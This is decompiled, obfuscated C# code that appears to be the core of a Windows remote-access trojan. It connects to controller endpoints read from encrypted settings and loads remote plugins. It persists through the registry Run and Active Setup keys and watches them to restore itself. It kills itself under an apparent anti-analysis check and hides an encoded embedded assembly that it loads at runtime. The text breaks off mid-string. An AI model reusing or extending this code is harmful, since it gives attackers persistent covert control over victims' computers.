using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Net;
using System.Reflection;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;
using Plugin;

namespace ns0;

internal class Class13
{
	private const string string_0 = "v8wCcnVycnJ2cnJycXFycipycnJycnJysnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJy8nJycoCRLIByJns/kypzvj+Txtrb5ZLi5OHZ5NPfktXT4ODh5pLU15Lk5+CS2+CStsHFkt/h1tegf398lnJycnJycnLCt3JyvnN1cq1A/sBycnJycnJyclJydJN9c3pyco5ycnJ4cnJycnJyAKxycnKScnJysnJycnKycnKScnJydHJydnJycnJycnJ2cnJycnJycnLycnJydHJycnJycnVysvdycoJycoJycnJygnJygnJycnJycoJycnJycnJycnJycrKscnK9cnJycrJycvJ1cnJycnJycnJycnJycnJycnJyctJycn5ycnIaq3JyjnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJyknJyenJycnJycnJycnJyepJycrpycnJycnJycnJycqDm1+rmcnJyBoxycnKScnJyjnJycnRycnJycnJycnJycnJycpJyctKg5OXk1XJycvJ1cnJysnJycnZycnKQcnJycnJycnJycnJycnKycnKyoOTX3uHVcnJ+cnJyctJycnJ0cnJylHJycnJycnJycnJycnJysnJytHJycnJycnJycnJycnJycnLirHJycnJycrpycnJ0cndyGpdycnKGcnJzcnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycsh0moNycnxycnTlhHJyfO97cnJ2cpxycoWidXLLcnJyc3Jyg3LlhXJyfPJ9cnJ25YZycnzyfHJydvB8cnJ28H1ycnZ04Ydycnxy8H1ycnbhiHJyfHLwfXJyduGJcnJ8fPB9cnJ24YpycnxyhvJ9cnJ2hvJ8cnJ2eH2dcnmccnJyhaJ0csVycnJ0cnKDcnTli3JyfPJ9cnJ25YZycnzyfHJydvB8cnJ28H1ycnbhjHJyfOd5cnJ0fPB9cnJ24Yhycnxy8H1ycnbhinJyfHKG8n1ycnaG8nxycnZ4fZ1yeZyQdJqDcnJ8nHKFonNyfXJycnVycoN07YRycnZ8nXJ4nJR0de+EcnJ2nIWic3J9cnJydnJyg3TthXJydnydcniclHR174VycnachaJ1crxycnJ3cnKDcnSajnJyfJqPcnJ8QohycnOakHJyfInhkXJyfHx4ANuIcHSIcHN+ep+IcniIDOaIcnJz4ZJycnzlk3JyfH2devCUcnJ8fZ1yeZx8cpxycnKFonVyonJycnhycoN07X5ycnZ8eH15dZqVcnJ85n5ycnN+dO5+cnJ2enmac3JynXx4eXBziHBzf3ufSpyFonVyonJycnhycoN07X5ycnZ8eH15dZqXcnJ85n5ycnN+dO5+cnJ2enmac3JynXx4eXBziHBzf3ufSpyFonVyonJycnhycoN07X9ycnZ8eH15dZqVcnJ85n5ycnN+dO5/cnJ2enmac3JynXx4eXBziHBzf3ufSpyFonVyonJycnhycoN07X9ycnZ8eH15dZqXcnJ85n5ycnN+dO5/cnJ2enmac3JynXx4eXBziHBzf3ufSpyFonVyonJycnhycoN07YBycnZ8eH15dZqVcnJ85n5ycnN+dO6AcnJ2enmac3JynXx4eXBziHBzf3ufSpyFonVyonJycnhycoN07YBycnZ8eH15dZqXcnJ85n5ycnN+dO6AcnJ2enmac3JynXx4eXBziHBzf3ufSpyFonVyonJycnlycoN07YFycnZ8eH15dZqVcnJ85nVycnR+dO6BcnJ2enmadHJynXx4eXBziHBzf3ufSpyFonVyonJycnlycoN07YFycnZ8eH15dZqXcnJ85nVycnR+dO6BcnJ2enmadHJynXx4eXBziHBzf3ufSpyFonVyonJycnpycoN07YJycnZ8eH15dZqVcnJ85nRycnR+dO6CcnJ2enmadXJynXx4eXBziHBzf3ufSpyFonVyonJycnpycoN07YJycnZ8eH15dZqXcnJ85nRycnR+dO6CcnJ2enmadXJynXx4eXBziHBzf3ufSpyFonVyonJycntycoN07YNycnZ8eH15dZqVcnJ85nZycnR+dO6DcnJ2enmadnJynXx4eXBziHBzf3ufSpyFonVyonJycntycoN07YNycnZ8eH15dZqXcnJ85nZycnR+dO6DcnJ2enmadnJynXx4eXBziHBzf3ufSpyFonVytnJycnxycoNydXx4iKB0nY907YFycnaGcHN9eZ+AdO2BcnJ2dHbheHJyeHKdj3TtgnJydoZwc315n4B07YJycnZ0duF0cnJ4cp1ynIWidXKPcnJyfXJyg3J07YNycnaGcHN8eJ+AdO2DcnJ2dHXhfHJyeHKccnJyhaJ1co9ycnJ9cnKDcnTtfnJydoZwc3x4n4B07X5ycnZ0huGYcnJ8cpxycnJ1onVyunJycnJycnJydO1+cnJ2hobhmHJyfHJ07X9ycnaGhuGYcnJ8cnTtgHJydoaG4ZhycnxydO2CcnJ2hobhdHJyeHJ07YNycnaGhuF8cnJ4cpyQdJqDcnJ8nLTFvLRzcnNycnJycn5ycnLopKCioKeiqaSpcnJycndy3nJycnZ7cnKV8HJy4ntyclJ5cnKVxebk2+DZ5XJycnLCg3JyenJycpXHxXLKg3JygnJycpW5x7u2cnJy2oNycgp0cnKVtN7h1HJycnJycnJ0cnJzyY8oe3t6cnJybJelcohycnNycnKXcnJye3JycoVycnKkcnJyo3JycphycnJ2cnJyhXJycn1ycnJzcnJyeHJycnNycnJ+cnJyjHJycnNycnJzcnJydHJycnZycnJycnxyc3JycnJyeHIIcgFyeHIacgFyeHIfcgFyeHIzcgFyeHJAcgFyeHKOcwFyeHK5c55zeHL0c8VzeHIRcwdzeHLOdAFyfHL3dOJ0eHJLdAFyeHJpdld2eHKAd1d2eHKdd1d2eHK8d1d2eHLVd1d2eHLud1d2eHIJd1d2eHIkd1d2eHJcdz13eHJwdz13eHJ+eFd2eHKXeFd2eHLHeLR42XLbeHJyeHIKeOp4eHIqeOp4eHJIeAFyeHJeeAdzeHJ7eep4eHKWeQFyeHKjeVd2eHK4eQFyeHIAeQFyeHIieRF5eHJFeQFycnJycnNycnJycnNyc3Jzc3JyiHKbcndyc3JzcnNzcnKicptyd3Jzcndyc3NycrRym3J3cnNye3Jzc3JyyXKbcntyc3J/cnNzcnLVcptye3J2cn9yc5KCctpym3J/cnlyf3JzcoJy5XKbcn9yfHKAcvNygnLwcptyf3J+coNyeHhkcpxyyPJscp9yyPJxcp9yeHhkcpxyyPJ5c61yyPKAc61yeHKHc7FyeHKTc7RyeHLAc7hyg3IEc8Nyg3Iec8dyc3JYdBByc3KZdRByc3K8dRByc3LfdRpyc3L8dSRyc3IcdS5yc3JddUByc3KAdkRycnJycnVy+Iomcnxyc3JycnJydXI4cyxygnJ1cnJycnJ1cjhzTnKKcndycnJycnVyOHNacpZye3JycnJydXL4iiZyfHJ8cnJycnJ1cjhzLHKCcn5ycnJycnVyOHNOcopygHJycnJydXI4c1pylnKEcnJycnJ1cviKJnJ8coVycnJycnVyOHMscoJyh3JycnJydXI4c05yinKJcnJycnJ1cjhzWnKWco1ywpJycnJy+Iomcr9yjnLaknJycnIIciFzy3KOckKScnJycghyK3PSco9yoZNycnJy+Iomcr9ykHJycnJycnI4fzdz2XKQcnJycnJycjh/QHPZcpBycnJycnJyOH9Qc9lykHJycnJycnI4f1tz3XKQcnJycnJycjh/bHPicpBycnJycnJyOH+EdOJykHJycnJycnI4f5Z04nKQcqqTcnJycvh6onTmcpBywZNycnJy+Hq4dOtykHJycnJycnI4f9Z08XKRcnJycnJycjh//HT2cpFyypNycnJy+HoKdPtykXLhk3JycnL4ehp0/3KRcuqTcnJycvh6KnQEcpJycnJycnJyOHczdL9yknJycnJycnI4dz50CXKSckCTcnJycjhzRnT/cpRyRpNycnJy+HpqdBRylXKClHJycnL4eoB1FHKWcr6UcnJycvh6oXUUcpdy+pRycnJy+HqtdRRymHI2lHJycnL4esR1FHKZcnKVcnJycvh60HUUcppyrpVycnJy+HrldR5ym3LqlXJycnL4eu91HnKcciaVcnJycvh6A3Uocp1yYpVycnJy+HoOdShynnKelnJycnL4eiV1MnKfctqWcnJycvh6MnUycqByFpZycnJy+HJCdThyoXJmlnJycnL4ckd163KjcpKXcnJycvhyUnW/cqRyvpdycnJy83Jbdb9ypHISl3JycnL2iiZyv3KkcnJyc3IUdnJydHIbdnJyc3IidnJydHJbdXJyc3IidnJydHJbdXJydXIpdnJydnIUdnJyc3IydnJyc3IUdnJydHIbdnJyc3IidnJydHJbdXJyc3IidnJydHJbdXJydXIpdnJydnIUdnJyc3IydnJyc3IUdnJydHIbdnJyc3IidnJydHJbdXJyc3IidnJydHJbdXJydXIpdnJydnIUdnJyc3IydnJyc3I5dnJyc3I+dnJyc3JAdnJyc3JAdnJyc3JGdnJydHJbdXJyc3JGdnJyc3JAdnJyc3JAdnJyc3JAdnJyc3JAdnJyc3JAdnJyc3JAdnJyc3JAdnJyc3JAdnJyc3JAdnJyc3JAdnJyc3JAdnJyc3JAdnJyc3JSdnJydHJbdXJyc3JbddtyJnJscuNyJnJscutyJnJscvNyJnJscvtyJnJscgNyJnJscgtyJnJschNyJnJschtyJnJxciNyJnJscityJnJscjNyJnJscjtyJnJ2c0tyJnJ8c1NyJnK/cltyJnK/cotyJnK/cn5yJnK/crtyJnK/crNyJnK/crNyIXOHc2NyZXi/crtya3iOc2Nyc3m/crtyJnKac7NyK3Ogc2tyJnK/cotym3m2c3tzrHm8c3NzynnFc3tz3HnOcyNy8HnZcqNyJnJscqNy+nm0cotzCXnfc5NzLnnrc4tzPnnfc9NyLHI+c3pyenKjcnpyfnKocnpyhnKjcnpyinKocqBylXJzdKBy7XLodKBypXKAdKBy5XLfdKByfXJGc6ByhXJSc6ByjXJtc6BynXJGc6ByrXJtc6ByvXJtc6ByxXKfdKBy1XLJdKBy3XLWdLN0TXKoctN0TXKocnJ1TXKocpJ1TXKocvJ1TXKochJ1TXKocpNzpnOtc7Jz13P9cwxzG3MqczRzOnN7cnNycnJYdKNycnKZdaNycnK8daNycnLfdX5ycnL8dXpycnIcdYJye3JzcnJynXZHcnJyonZHcnJyrnZHcnJytXZLcnJywnZQcnJy1nZQcnJy5HZQcnJy7HZUcnJyznRZcnJy/nZecnJyCHZjcnJyjnNncoJylXJ0cnpylHJ0cnRyg3J1coJyl3J2cnpylnJ2cnRyhHJ3cnpymHJ4coJymXJ4cnRyhXJ5coJym3J6cnpymnJ6cnRyhnJ7coJynXJ8cnpynHJ8cnRyh3J9coJyn3J+cnpynnJ+cnRyiHJ/cnRyiXKBcnRyinKDcnNyi3KDcnRyjHKFcnRyjXKHcnNyj3KJcnRyjnKJcnRykHKLcoFzdvJycnNycnJycnJycnJycnJy8HJycnRycnJycnJycnJycnNy+HJycnJydHJycnJycnJycnJyc3LidHJycnK7cvhzu3IHc7tyFnO7ciVzcnJyrr/h1ufe17Byu8Le59nb4KDW3t5ywefm4ufmt+jX4Oa60+DW3tfkcsLe59nb4HK74OLn5rfo1+DmutPg1t7X5HLE19XX2+jX1rfo1+DmutPg1t7X5HLC3ufZ2+DF5tPm13LF29bXcsLe59nb4LPk2eVyxdfk29Pe2+zX5HK7wt7n2dvgct/l1eHk3tvUcsXr5ebX33K/597m29XT5ea2197X2dPm13K34OffcsHU3NfV5nKg1ebh5HK74Ojh3ddyu7Pl6+DVxNfl597mcrPl6+DVtdPe3tTT1d1ytNfZ2+C74Ojh3ddycuSodrfg1rvg6OHd13Lo097n19HRcsDBwLdyxMfAwLvAuXK1vru3wMZyxbfEyLfEcrrX09bX5HK559vWcsLe59nb4Lnn29Zyxevl5tffoLXh3t7X1ebb4eDloLnX4Nfk29Vyvtvl5tKjcrbT5tNyxevl5tffoMTn4Obb39egxdfk29Pe2+zT5tvh4KC44eTf0+bm1+TloLTb4NPk63K02+DT5Ou44eTf0+bm1+Ry1Nhyxevl5tffoLvBcr/X3+Hk68Xm5NfT33Lf5XLF1+Tb097b7Ndyttfl1+Tb097b7Ndy2dfm0cDT39dy2dfm0bbX5dXk2+Lm2+HgctnX5tGz5+ba4eRy2dfm0bXn5OTX4ObF5tPm13LZ1+bRxebh4sHgttvl1eHg4NfV5tvh4HLZ1+bRt+rX1efm18HgvuHT1nLZ1+bRutPluOHk33LZ1+bRt+rX1efm18HgvuHT1rPk2eVy5dfm0bfq19Xn5tfB4L7h09az5NnlcsjX5OXb4eBy2dfm0cjX5OXb4eByxevl5tffoMnb4Nbh6eWguOHk3+VyuOHk33LZ1+bRu+Di5+a44eTfctnX5tHF5tPm18HU3NfV5nLl1+bRxebT5tfB1NzX1eZy2dfm0bnn29Zyu+Db5tvT3tvs13K36tfV5+bXcsXm4eJyt+jX4Oa60+DW3tfkcrfq19Xn5tvh4LXh3+Le1+bXctPW1tG36tfV5+bb4eC14d/i3tfm13Lk19/h6NfRt+rX1efm2+HgteHf4t7X5tdyxebT5ObX1nLT1tbRxebT5ObX1nLk19/h6NfRxebT5ObX1nLF5uHi4tfWctPW1tHF5uHi4tfWcuTX3+Ho19HF5uHi4tfWcrvg4ufmctPW1tG74OLn5nLk19/h6NfRu+Di5+Zywefm4ufmctPW1tHB5+bi5+Zy5Nff4ejX0cHn5uLn5nLE19XX2+jX1nLT1tbRxNfV19vo19Zy5Nff4ejX0cTX1dfb6NfWcsXX4NZyweDE19XX2+jX1nK36tfV5+bX1nLXcq636tfV5+bXweC+4dPWs+TZ5bDd0dG009Xd2+DZuNvX3tZyrsXm0+bXwdTc19XmsN3R0bTT1d3b4Nm429fe1nLA09/XcrbX5dXk2+Lm2+HgcrPn5trh5HK15+Tk1+DmxebT5tdyxebh4sHgttvl1eHg4NfV5tvh4HK36tfV5+bXweC+4dPWcrrT5bjh5N9yt+rX1efm18HgvuHT1rPk2eVyu+Di5+a44eTfcsXm0+bXwdTc19XmcuHU3NfV5nLf1+ba4dZy5dfg1tfkctXT3t7U09XdcuTX5efe5nLT5NnlctRy6NPe59dy5ebT5tfB1NzX1eZy5dvW13LF6+Xm19+gxNfY3tfV5tvh4HKz5eXX39Te68bb5t7Xs+bm5NvU5+bXcrPl5dff1N7rttfl1eTb4ubb4eCz5ubk29Tn5tdys+Xl19/U3uu14eDY29nn5NPm2+Hgs+bm5NvU5+bXcrPl5dff1N7rteHf4tPg67Pm5uTb1Ofm13Kz5eXX39Te68Lk4dbn1eaz5ubk29Tn5tdys+Xl19/U3uu14eLr5NvZ2uaz5ubk29Tn5tdys+Xl19/U3uvG5NPW19/T5N2z5ubk29Tn5tdys+Xl19/U3uu1597m5+TXs+bm5NvU5+bXcsXr5ebX36DE5+Dm29/XoLvg5tfk4eLF1+To29XX5XK14d/I2+Xb1N7Xs+bm5NvU5+bXcrnn29az5ubk29Tn5tdys+Xl19/U3uvI1+Tl2+Hgs+bm5NvU5+bXcrPl5dff1N7ruNve18jX5OXb4eCz5ubk29Tn5tdyxevl5tffoLbb09ng4eXm29XlcrbX1OfZ2dPU3tez5ubk29Tn5tdyttfU59nZ2+DZv+HW1+Vyxevl5tffoMTn4Obb39egteHf4tve1+TF1+To29XX5XK14d/i297T5tvh4MTX3tPq0+bb4eDls+bm5NvU5+bXcsTn4Obb39e14d/i0+bb1Nve2+brs+bm5NvU5+bXcsXX5NvT3tvs09Te17Pm5uTb1Ofm13LF5uTX099ytd7h5ddyxuGz5OTT63K22+Xi4eXXcrXh3+Lb3tfkudfg1+TT5tfWs+bm5NvU5+bXcsbr4tdyudfmxuvi13Kz5eXX39Te63K51+az5eXX39Te63LE5+Dm29/Xxuvi17rT4Nbe13K51+bG6+LXuOTh37rT4Nbe13K51+a15+Xm4d+z5ubk29Tn5tflctnX5tHI097n13K33+Lm63K2197X2dPm13K14d/U2+DXcsXr5ebX36DG2uTX09bb4Nlyu+Dm1+Te4dXd19ZyteHf4tPk17fq1drT4NnXcsTX3+Ho13K36Nfg5rPk2eVycnJycnWScnJycnJGjyFWwEIcswqRHZban6i0cnop7M7Ii6ZS+3eSdHOOinmSdHOEloSOfZJ2hIOEloSOhIeOd5Jzc4SDdHh6dXiDhnZycnJydnNycnJ1eIOKdHiAdXiDi3h4h4SPc451knJzdXiEk3V4hJd4cnOPd4SOeHJzhI6Pd3WScoB2knKDhnWScnR2knKEjneSc3OEjnaScoSbdpJyhJ91knKOdpJzc452knKDi3iSdHOOhI51eISjd5Jzc4SjdXiEfneSc3OEfnV4hHp3knNzhHp1eISCd5Jzc4SCeZJ0c4OKhI51eISOdHiOdZpygHaacoOGdZpydHaacoSOdppyhJt2mnKEn3Waco52mnKDi3aSc3OAdpJzc3R3knNzg9t2knNzeneHhI9zjniSdHOE6452knKPd3h5dI93j3d3knNzj3d3knOOhOt4eXSEjoSOdnlzhI51eXOOd5JyhPLzenJzhPL3hPLzenJzhPLzg/L7epJ0j46E8vN0eXl1j46Di3R9cnSE8v+E8v+E8v9+gnN1kHKCkHKQcpBydnxzhKN7eXaEo4SjhKN0dnxzhH57eXaEfoR+hH50dnxzhHp7eXaEeoR6hHp0dnxzhIJ7eXaEgoSChIJ0d3l0g4p0dXlzdHmSdHOOhPIHfXNyeMLe59nb4HJyjHNyh8DX5p/J19Po15LC3ufZ2+CStNPl13Jyd3NycnJyfnNyeerF297X4OZycpBzcou14eLr5NvZ2uaSNBuS6sXb3tfg5pKkoqOjcnKbc3KWqaWo06bXoqef1dSr15+m1KfYn6vW1qefpNPVqKvX2NWi1qurcnJ+c3J5o6CioKKgonJyenNyeXNycnJyenNyenJycnJykHNyc3LGdIjJ5NPiwOHgt+rV1+Lm2+Hgxtrk4enlc3JycnJycnKtQP7AcnJycnRycnLscnJyNqtycjaNcnLExbbF4un6MGzecr/1Jn991pzlI3RycnK1rM7H5dfk5c7A0+ba0+DOtuHV59/X4Oblzsjb5efT3pLF5ufW2+GSpKKjos7C5OHc19Xm5c7C5OHc19Xmkra24cXX5M7C3ufZ2+DO4dTczrbX1OfZzrvC3ufZ2+Cg4tbUcnJy2qxycnJycnJycnJy8KxycnKScnJycnJycnJycnJycnJycnJycnJycuKscnJycnJycnLRteHktt7ev9Pb4HLf5dXh5NfXoNbe3nJycnJycZdykrJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJyc3KCcnJyinJy8nJycnJycnJycnJycnJyc3JzcnJyonJy8nJycnJycnJycnJycnJyc3JycnJyunJycsqycnKWdXJycnJycnJycnKWdaZycnLIcsVy0XLIcrdyxHLFcrtywXLActFyu3LAcrhywXJycnJyL3ZhcHJyc3JycnNycnJycnJyc3JycnJysXJycnJycnJ2cnJydHJycnJycnJycnJycnJycrZycnJzcshy03Lkcrhy23Lectdyu3Lgcthy4XJycnJylnJ2cnJyxnLkctNy4HLlct5y03Lmctty4XLgcnJycnJyciJ29nRycnNyxXLmcuRy23LgctlyuHLbct5y13K7cuBy2HLhcnJy0nRycnNyonKicqJyonKicqZy1HKicnJytnKIcnNytXLhct9y33LXcuBy5nLlcnJywHLXcuZyn3LJctdy03LoctdyknLCct5y53LZctty4HKScrRy03LlctdycnKicnpyc3K1cuFy33LictNy4HLrcsBy03LfctdycnJycupyxXLbct5y13LgcuZycnKqcnlyc3K4ctty3nLXcrZy13LlctVy5HLbcuJy5nLbcuFy4HJycnJywnLecudy2XLbcuBycnJycqJyenJzcrhy23LectdyyHLXcuRy5XLbcuFy4HJycnJyo3KgcqJyoHKicqByonJycqpyfnJzcrty4HLmctdy5HLgctNy3nLActNy33LXcnJyu3LCct5y53LZctty4HKgctZy3nLecnJyynKLcnNyvnLXctly03LecrVy4XLicuty5HLbctly2nLmcnJytXLhcuJy63Lkctty2XLacuZyknIbcpJy6nLFctty3nLXcuBy5nKScqRyonKjcqNycnJycrJyfnJzcsFy5HLbctly23LgctNy3nK4ctty3nLXcuBy03LfctdycnK7csJy3nLnctly23LgcqBy1nLect5ycnKicnlyc3LCcuRy4XLWcudy1XLmcsBy03LfctdycnJycsJy3nLnctly23LgcnJycnKmcnpyc3LCcuRy4XLWcudy1XLmcshy13LkcuVy23LhcuBycnKjcqByonKgcqJyoHKicnJyqnJ6cnNys3LlcuVy13LfctRy3nLrcpJyyHLXcuRy5XLbcuFy4HJycqNyoHKicqByonKgcqJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJyonJyfnJycgKscnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycg==";

	private static List<GClass1> list_0;

	private static List<Class12> list_1;

	private static bool bool_0;

	private static bool bool_1;

	private static int int_0;

	[MTAThread]
	private static int Main()
	{
		if (Class1.bool_13 && (!Class1.bool_0 || !(Process.GetCurrentProcess().MainModule!.FileName == Path.Combine(Class1.string_1, Class10.smethod_3(Class1.string_2, bool_0: true)))))
		{
			Class0.smethod_0();
		}
		smethod_0();
		smethod_1();
		try
		{
			while (true)
			{
				string text = Console.ReadLine();
				if (text.ToLower() == "clear")
				{
					Console.Clear();
				}
			}
		}
		catch
		{
		}
		Process.GetCurrentProcess().WaitForExit();
		return 0;
	}

	private static void smethod_0()
	{
		//IL_015e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0168: Expected O, but got Unknown
		bool_0 = false;
		bool_1 = false;
		AppDomain.CurrentDomain.AssemblyResolve += smethod_6;
		Class7.smethod_0(Class1.string_6);
		if (Class7.Boolean_0)
		{
			Process.GetCurrentProcess().Kill();
			return;
		}
		string[] array = Class10.smethod_3(Class1.string_0, bool_0: true).Split(new char[1] { '|' });
		list_1 = new List<Class12>();
		for (int i = 0; i < array.Length; i++)
		{
			if (!string.IsNullOrEmpty(array[i]))
			{
				Class12 @class = new Class12(array[i].Split(new char[1] { '>' })[0], int.Parse(array[i].Split(new char[1] { '>' })[1]), Class10.smethod_2(array[i].Split(new char[1] { '>' })[2].Trim(), bool_0: true));
				@class.Disconnected += smethod_10;
				@class.ConnectionAccepted += smethod_9;
				@class.Received += smethod_8;
				@class.Sent += smethod_11;
				list_1.Add(@class);
			}
		}
		GClass0.smethod_0();
		GClass2.PluginAdded += smethod_5;
		SystemEvents.add_SessionEnding(new SessionEndingEventHandler(smethod_4));
		if (Class1.bool_0 && Process.GetCurrentProcess().MainModule!.FileName != Path.Combine(Class1.string_1, Class10.smethod_3(Class1.string_2, bool_0: true)))
		{
			new Thread(Class5.smethod_0).Start();
		}
		if (Class1.bool_10 && Process.GetCurrentProcess().MainModule!.FileName != Path.Combine(Class1.string_1, Class10.smethod_3(Class1.string_2, bool_0: true)))
		{
			GClass0.smethod_3();
		}
		if (Class1.bool_0 && Process.GetCurrentProcess().MainModule!.FileName == Path.Combine(Class1.string_1, Class10.smethod_3(Class1.string_2, bool_0: true)))
		{
			GClass2.smethod_1();
		}
		else
		{
			GClass2.smethod_2();
		}
		if (Class1.bool_0)
		{
			list_0 = new List<GClass1>();
			GClass1 gClass = new GClass1(Class1.registryHive_0, Class1.string_9);
			gClass.GEnum0_0 = GEnum0.flag_0 | GEnum0.flag_2;
			gClass.RegChanged += smethod_2;
			if (Class1.bool_12)
			{
				if (Class1.bool_1)
				{
					GClass1 gClass2 = new GClass1(RegistryHive.CurrentUser, "Software\\Microsoft\\Windows\\CurrentVersion\\Run");
					gClass2.RegChanged += smethod_3;
					gClass2.GEnum0_0 = GEnum0.flag_0 | GEnum0.flag_2;
					list_0.Add(gClass2);
				}
				if (Class1.bool_2)
				{
					GClass1 gClass3 = new GClass1(RegistryHive.CurrentUser, "Software\\Microsoft\\Windows\\CurrentVersion\\Run");
					gClass3.RegChanged += smethod_3;
					gClass3.GEnum0_0 = GEnum0.flag_0 | GEnum0.flag_2;
					list_0.Add(gClass3);
				}
				if (Class1.bool_3)
				{
					GClass1 gClass4 = new GClass1(RegistryHive.LocalMachine, "SOFTWARE\\Microsoft\\Active Setup\\Installed Components");
					gClass4.RegChanged += smethod_3;
					gClass4.GEnum0_0 = GEnum0.flag_0 | GEnum0.flag_2;
					list_0.Add(gClass4);
				}
			}
		}
		Class1.string_11 = smethod_21(smethod_20() + "|" + Environment.UserName);
	}

	private static void smethod_1()
	{
		foreach (Class12 item in list_1)
		{
			item?.method_0();
		}
		if (list_0 != null)
		{
			foreach (GClass1 item2 in list_0)
			{
				item2.method_2();
			}
		}
		Class11.smethod_2();
		if (Class1.bool_4)
		{
			smethod_18();
		}
	}

	private static void smethod_2(object sender, EventArgs e)
	{
		ThreadStart start = GClass2.smethod_0;
		new Thread(start).Start();
	}

	private static void smethod_3(object sender, EventArgs e)
	{
		ThreadStart start = Class5.smethod_2;
		new Thread(start).Start();
	}

	private static void smethod_4(object sender, SessionEndingEventArgs e)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Invalid comparison between Unknown and I4
		if ((int)e.get_Reason() == 2 && Class1.bool_0)
		{
			Class5.smethod_0();
		}
	}

	private static void smethod_5(object object_0, IPlugin iplugin_0)
	{
		//Error decoding local variables: Signature type sequence must have at least one element.
		//IL_001a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0024: Expected O, but got Unknown
		try
		{
			iplugin_0.add_ExecutionComplete((EventHandler)smethod_15);
			iplugin_0.add_Output(new OutputEventHandler(smethod_14));
			iplugin_0.add_Started((EventHandler)smethod_13);
			iplugin_0.add_Stopped((EventHandler)smethod_12);
			GClass2.sortedList_1[iplugin_0.get_Guid()] = iplugin_0;
		}
		catch
		{
		}
	}

	private static Assembly smethod_6(object object_0, ResolveEventArgs resolveEventArgs_0)
	{
		return Assembly.Load(Encoding.GetEncoding(1252).GetBytes(Class10.smethod_3("v8wCcnVycnJ2cnJycXFycipycnJycnJysnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJy8nJycoCRLIByJns/kypzvj+Txtrb5ZLi5OHZ5NPfktXT4ODh5pLU15Lk5+CS2+CStsHFkt/h1tegf398lnJycnJycnLCt3JyvnN1cq1A/sBycnJycnJyclJydJN9c3pyco5ycnJ4cnJycnJyAKxycnKScnJysnJycnKycnKScnJydHJydnJycnJycnJ2cnJycnJycnLycnJydHJycnJycnVysvdycoJycoJycnJygnJygnJycnJycoJycnJycnJycnJycrKscnK9cnJycrJycvJ1cnJycnJycnJycnJycnJycnJyctJycn5ycnIaq3JyjnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJyknJyenJycnJycnJycnJyepJycrpycnJycnJycnJycqDm1+rmcnJyBoxycnKScnJyjnJycnRycnJycnJycnJycnJycpJyctKg5OXk1XJycvJ1cnJysnJycnZycnKQcnJycnJycnJycnJycnKycnKyoOTX3uHVcnJ+cnJyctJycnJ0cnJylHJycnJycnJycnJycnJysnJytHJycnJycnJycnJycnJycnLirHJycnJycrpycnJ0cndyGpdycnKGcnJzcnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycsh0moNycnxycnTlhHJyfO97cnJ2cpxycoWidXLLcnJyc3Jyg3LlhXJyfPJ9cnJ25YZycnzyfHJydvB8cnJ28H1ycnZ04Ydycnxy8H1ycnbhiHJyfHLwfXJyduGJcnJ8fPB9cnJ24YpycnxyhvJ9cnJ2hvJ8cnJ2eH2dcnmccnJyhaJ0csVycnJ0cnKDcnTli3JyfPJ9cnJ25YZycnzyfHJydvB8cnJ28H1ycnbhjHJyfOd5cnJ0fPB9cnJ24Yhycnxy8H1ycnbhinJyfHKG8n1ycnaG8nxycnZ4fZ1yeZyQdJqDcnJ8nHKFonNyfXJycnVycoN07YRycnZ8nXJ4nJR0de+EcnJ2nIWic3J9cnJydnJyg3TthXJydnydcniclHR174VycnachaJ1crxycnJ3cnKDcnSajnJyfJqPcnJ8QohycnOakHJyfInhkXJyfHx4ANuIcHSIcHN+ep+IcniIDOaIcnJz4ZJycnzlk3JyfH2devCUcnJ8fZ1yeZx8cpxycnKFonVyonJycnhycoN07X5ycnZ8eH15dZqVcnJ85n5ycnN+dO5+cnJ2enmac3JynXx4eXBziHBzf3ufSpyFonVyonJycnhycoN07X5ycnZ8eH15dZqXcnJ85n5ycnN+dO5+cnJ2enmac3JynXx4eXBziHBzf3ufSpyFonVyonJycnhycoN07X9ycnZ8eH15dZqVcnJ85n5ycnN+dO